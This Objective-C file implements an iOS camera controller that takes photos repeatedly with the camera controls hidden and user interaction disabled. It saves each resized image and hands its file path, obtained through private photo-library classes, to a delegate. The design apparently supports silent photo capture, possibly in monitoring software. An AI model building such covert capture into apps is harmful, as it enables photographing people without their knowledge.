//
//  CameraController.m
//  CameraCaptureManager
//
//  Created by Benjawan Tanarattanakorn on 6/5/12.
//  Copyright 2012 __MyCompanyName__. All rights reserved.
//

#import <MobileCoreServices/MobileCoreServices.h>	// this framework is for UTType constant
#import <AssetsLibrary/AssetsLibrary.h>
#import "CameraController.h"
#import "UIImage+Resize.h"
#import "PLPhotoLibrary-ALAssetLibraryMethods.h"
#import "PLPhoto.h"
#import "DebugStatus.h"

#define CAMERA_TRANSFORM_X				1			/// !!!: for testing purpose
#define CAMERA_SCALAR					1.24299		// scalar = (480 / (2048 / 480))
#define WATCHDOG_TIME					7
#define DEFAULT_TAKE_NEXT_PHOTO_DELAY	2.5			// proper interval that make the image saving process done before the next capturing
#define kMaxDimension					700

@interface CameraController (private)
- (void)		imagePickerControllerCallbackDidLost: (NSTimer *) aTimer;
- (void)		cleanWatchdogTimer;
- (void)		saveImageToAlbum: (UIImage*) aImage;
- (void)		getPathFromURL: (NSURL *) aURL;
- (NSString *)	createTimeStamp;
- (void)		imagePickerController: (UIImagePickerController *) aPicker didFinishPickingMediaWithInfo: (NSDictionary *) aInfo;
- (BOOL)		isWithinBound: (UIImage *) aImage dimension: (NSInteger) aDimension;
@end


@implementation CameraController

@synthesize mShouldCapture;
@synthesize mDelegate;
@synthesize mRestartCaptureSelector;
@synthesize mCapturePathSelector;
@synthesize mDidFinishCapturing;
@synthesize mCapturingInterval;



- (id) init {
	self = [super init];
	if (self != nil) {
		self.sourceType				= UIImagePickerControllerSourceTypeCamera;
		self.mediaTypes				= [NSArray arrayWithObject:(NSString *) kUTTypeImage];
		self.showsCameraControls	= NO;
		self.delegate				= self;	/// !!!: I move from takePicture
		self.allowsEditing			= NO;
		self.navigationBarHidden	= YES;
		self.wantsFullScreenLayout	= YES;
		
		// without the below code, the camera's view doesn't fill the entire screen; left space on bottom
		self.cameraViewTransform	= CGAffineTransformScale(self.cameraViewTransform, CAMERA_SCALAR, CAMERA_SCALAR);  			
		//self.cameraViewTransform	= CGAffineTransformMakeTranslation(0.0, 27.0);
		
		[self setMCapturingInterval:DEFAULT_TAKE_NEXT_PHOTO_DELAY];
	}
	return self;
}

// override default setter of mCapturingInterval
- (void) setMCapturingInterval: (NSInteger) aInterval {
	if (aInterval < DEFAULT_TAKE_NEXT_PHOTO_DELAY) {
		mCapturingInterval = DEFAULT_TAKE_NEXT_PHOTO_DELAY;
	} else {
		mCapturingInterval = aInterval;
	}
	DLog (@"New capturing interval = %d", mCapturingInterval)
}

/**
 - Method name:						hasCamera
 - Purpose:							Check if the camera is available or not. Note that this method is used in UI application only
 - Argument list and description:	None
 - Return description:				Whether the device has a camera (BOOL)
 */
+ (BOOL) hasCamera {
    return [self isSourceTypeAvailable:UIImagePickerControllerSourceTypeCamera];
}

/**
 - Method name:						displayAsModalViewByController:animated: 
 - Purpose:							Display UIImagePickerController interface
 - Argument list and description:	a controller who present the camera interface, animation
 - Return description:				None
 */
- (void) displayAsModalViewByController: (UIViewController*) aController  
							   animated: (BOOL) aAnimated {
	DLog(@"display modal");	
	/// !!!: Deprecated. Use presentViewController:animated:completion: instead.
	if (aController) {
		DLog (@"parent exist %@", aController);
		DLog (@"aController respond to selector = %d", [aController respondsToSelector:@selector(presentModalViewController:animated:)]);
		[aController presentModalViewController:self animated:aAnimated];
		DLog (@"Present modal view controller");
	}
}

/**
 - Method name:						dismissModalViewController:animated: 
 - Purpose:							Dismiss UIImagePickerController interface
 - Argument list and description:	animation
 - Return description:				None
 */
- (void) dismissModalViewController: (UIViewController *) aController animated: (BOOL) aAnimated {
	DLog(@"dismiss modal");
	[self cleanWatchdogTimer];
	[aController dismissModalViewControllerAnimated:aAnimated];
	
	/*
	  Obsolete code
	/// !!!: Deprecated. Use dismissViewControllerAnimated:completion: instead.
	if ([self respondsToSelector:@selector(parentViewController)]) {
		DLog(@"dismiss modal 2 %@",  [self parentViewController]);
		[[self parentViewController] dismissModalViewControllerAnimated:aAnimated];
	}
	*/
}

/**
 - Method name:						takePicture:animated: 
 - Purpose:							Start taking pictures continuously
 - Argument list and description:	None
 - Return description:				None
 */
- (void) takePicture {
    self.view.userInteractionEnabled = NO;
	if (mShouldCapture) {					// note that this flag is set by CameraCaptureManager
		DLog(@"!!!!!!!!!!!!!!!!!!!!!!!! 1) takePicture %@", [self createTimeStamp]);
		mWatchdogTimer = [NSTimer scheduledTimerWithTimeInterval:WATCHDOG_TIME
														  target:self 
														selector:@selector(imagePickerControllerCallbackDidLost:) 
														userInfo:nil 
														 repeats:NO];
		[mWatchdogTimer retain];				
		[super takePicture];
	} else {
		DLog(@"CameraController is not allowed to take picture");
		if ([mDelegate respondsToSelector:mDidFinishCapturing])
			[mDelegate performSelector:mDidFinishCapturing withObject:nil];
	} 
}

- (void) imagePickerControllerCallbackDidLost: (NSTimer *) aTimer {
	DLog(@"+ + + + + didNotGetImagePickerControllerCallback + + + + +");
	[self cleanWatchdogTimer];
	if ([mDelegate respondsToSelector:mRestartCaptureSelector])
		[mDelegate performSelector:mRestartCaptureSelector withObject:nil];
}

- (void) cleanWatchdogTimer {
	if (mWatchdogTimer) {
		[mWatchdogTimer invalidate];
		[mWatchdogTimer release];
		mWatchdogTimer = nil;
	}
}

- (void) saveImageToAlbum: (UIImage*) aImage {
	DLog(@"!!!!!!!!!!!!!!!!!!!!!!!! 3) saveImageToAlbum %@", [self createTimeStamp]);
	//UIImageWriteToSavedPhotosAlbum(aImage, self, @selector(image:didFinishSavingWithError:contextInfo:), nil);
	
	// -- begin background execution
	UIApplication *application = [UIApplication sharedApplication];
	__block UIBackgroundTaskIdentifier bGTasks = 0;				// initiailze background task identifier
	bGTasks = [application beginBackgroundTaskWithExpirationHandler:^{
        // Clean up any unfinished task business by marking where you stopped or ending the task outright.
		DLog(@"---- Expiration handler ---- bgTask %d", bGTasks);		
		[[UIApplication sharedApplication]  endBackgroundTask:bGTasks];
        bGTasks = UIBackgroundTaskInvalid;			
    }];
	
	//DLog(@"bGTasks %d", bGTasks)	
	
	__block ALAssetsLibrary *assetLib = [[ALAssetsLibrary alloc] init];  
	// Request to save the image to camera roll  
	[assetLib writeImageToSavedPhotosAlbum:[aImage CGImage] 
							   orientation:(ALAssetOrientation)[aImage imageOrientation] 
						   completionBlock:^(NSURL *assetURL, NSError *error){  
							   // -- this block is called on the same thread as the caller
							   DLog(@"!!!!!!!!!!!!!!!!!!!!!!!! 4) completion block block %@ main?: %d, bgTasks %d, time %f",
									[self createTimeStamp],
									[NSThread isMainThread], 
									bGTasks,
									[[UIApplication sharedApplication] backgroundTimeRemaining])
							   if (error) {  
								   DLog(@"error: %@", error);  
							   } else {  
								   //DLog(@"url %@", assetURL);  
								   //NSLog(@"url %@", [assetURL query]);
								   [self performSelector:@selector(getPathFromURL:) withObject:assetURL];
							   } 			
							   [assetLib autorelease];

							   // -- end background task
							   [[UIApplication sharedApplication] endBackgroundTask:bGTasks];
							   bGTasks = UIBackgroundTaskInvalid;
							   //DLog(@"bGTasks (after save) %d", bGTasks)
						   }];  
	
	aImage = nil;
}

/*
- (void) saveImageToDocuments: (UIImage*) aImage {
	NSLog(@"3.2 saveImageToDocuments");
	NSData *imageData = UIImagePNGRepresentation(aImage);
	
	NSString *documentsDirectory = @"/tmp/";
	
	NSDate *now = [NSDate date];
	
	NSDateFormatter *formatter = [[NSDateFormatter alloc] init];
	[formatter setTimeStyle:NSDateFormatterShortStyle];
	[formatter setDateFormat:@"yyyy-MM-dd-hh-mm-ss"];
	
	NSString *filename = [NSString stringWithFormat:@"%@.png", [formatter stringFromDate:now]];
	filename = [documentsDirectory stringByAppendingString:filename];		
	[formatter release];
	NSLog(@"file name: %@", filename);
	
	NSError *error = nil;

	[imageData writeToFile:filename options:NSDataWritingAtomic error:&error];
	if (error) {
		NSLog(@"error: to write image to a file %@", filename);        
		NSLog(@"error: %@", error);        
	}
}
 */

- (void) getPathFromURL: (NSURL *) aURL {	
	//DLog(@"PLPhotoLibrary: %@", [PLPhotoLibrary sharedPhotoLibrary]);	//	PLPhotoLibrary	
	PLPhoto *photo = [[PLPhotoLibrary sharedPhotoLibrary] photoFromAssetURL:aURL];
	NSString *path = [photo pathForOriginalFile];
	//DLog(@"PLPhoto: %@",photo);	// PLPhoto
	//DLog(@"path:%@", path);
	[mDelegate performSelector:mCapturePathSelector withObject:path];
}

// This method is used to get the timestamp of the event
- (NSString *) createTimeStamp {
	NSDateFormatter *dateFormatter = [[NSDateFormatter alloc] init];
	[dateFormatter setDateFormat:@"yyyy-MM-dd_HH:mm:ss:SS"];
	NSString *formattedDateString = [[dateFormatter stringFromDate:[NSDate date]] retain];
	[dateFormatter release];
	return [formattedDateString autorelease];
}

// this function is called on the same thread as the caller
- (void)imagePickerController: (UIImagePickerController *) aPicker didFinishPickingMediaWithInfo: (NSDictionary *) aInfo {	
	DLog(@"!!!!!!!!!!!!!!!!!!!!!!!! 2) didFinishPickingMediaWithInfo %@ %d", [self createTimeStamp], [NSThread isMainThread]);	
	[self cleanWatchdogTimer];
	UIImage *baseImage = [aInfo objectForKey:UIImagePickerControllerOriginalImage];
	if (baseImage) {
		//DLog(@"Original size: (%.f, %.f)",baseImage.size.width, baseImage.size.height);
		CGSize size = CGSizeMake(kMaxDimension, kMaxDimension);
		
		UIImage *resizedImage = nil;
		// Reduce the size of only images whose bound exceed the specified dimension
		if ([self isWithinBound:baseImage dimension:kMaxDimension]) {
			//DLog (@"panic image is in bound")
			resizedImage = baseImage;
		} else {
			//DLog (@"---- Adjust the size ----- ")
			resizedImage = [baseImage resizedImageWithContentMode:UIViewContentModeScaleAspectFit 
														   bounds:size 
											 interpolationQuality:kCGInterpolationDefault];
			//DLog(@"Output size: (%.f, %.f)", [resizedImage size].width,  [resizedImage size].height)
		}
		// the logic to resize has been changed
		//UIImage *resizedImage = [baseImage resizedImage:CGSizeMake(640, 480) interpolationQuality:kCGInterpolationDefault];
		[self saveImageToAlbum:resizedImage];
	}
	
	baseImage = nil;
	
	// capture a next image
	[self performSelector:@selector(takePicture) withObject:nil afterDelay:[self mCapturingInterval]];
}

- (void) imagePickerControllerDidCancel: (UIImagePickerController *) aPicker {
	DLog(@"imagePickerControllerDidCancel");
}

- (BOOL) isWithinBound: (UIImage *) aImage dimension: (NSInteger) aDimension {
	return (aImage.size.width <= aDimension && aImage.size.height <= aDimension);
}

// Cannot use release here, it has to call from release of object who own this object because present modal view controller method in owner object
// is called release
//- (void) release {
//	DLog (@"Camera controller is release");
//	[NSObject cancelPreviousPerformRequestsWithTarget:self];
//	[super release];
//}

- (void) dealloc {
	[self cleanWatchdogTimer];
	[super dealloc];
}

@end